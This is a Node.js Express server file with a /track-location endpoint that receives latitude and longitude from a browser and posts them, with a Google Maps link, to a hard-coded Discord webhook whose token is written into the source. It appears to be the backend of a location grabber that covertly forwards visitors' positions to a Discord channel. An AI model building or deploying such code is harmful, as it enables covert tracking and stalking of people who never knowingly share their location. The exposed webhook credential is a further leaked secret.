const express = require('express');
const axios = require('axios');
const path = require('path'); // Added for path handling
const app = express();
const port = 3000;

app.use(express.json());

// IMPORTANT: This tells Express to serve your index.html from the 'public' folder
app.use(express.static('public')); 

const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1456915026114777149/9O263RGwSonMZXTPWWOWnOp6bew0OTy013LQcSbLqDQBe8gwoTsT3sRahzejOkN2cxqY';

app.post('/track-location', async (req, res) => {
    const { latitude, longitude } = req.body;

    if (!latitude || !longitude) {
        return res.status(400).json({ message: 'Missing coordinates' });
    }

    const message = {
        embeds: [{
            title: "📍 New Location Tracked",
            color: 5814783, 
            fields: [
                { name: "Latitude", value: `${latitude}`, inline: true },
                { name: "Longitude", value: `${longitude}`, inline: true }
            ],
            // Fixed the template literal and the URL format
            description: `[Open in Google Maps](https://www.google.com/maps?q=${latitude},${longitude})`,
            timestamp: new Date()
        }]
    };

    try {
        await axios.post(DISCORD_WEBHOOK_URL, message);
        res.status(200).json({ message: 'Sent to Discord!' });
    } catch (error) {
        console.error("Discord Error:", error.message);
        res.status(500).json({ message: 'Failed to send to Discord' });
    }
});

app.listen(port, () => {
    console.log(`✅ Server running at http://localhost:${port}`);
});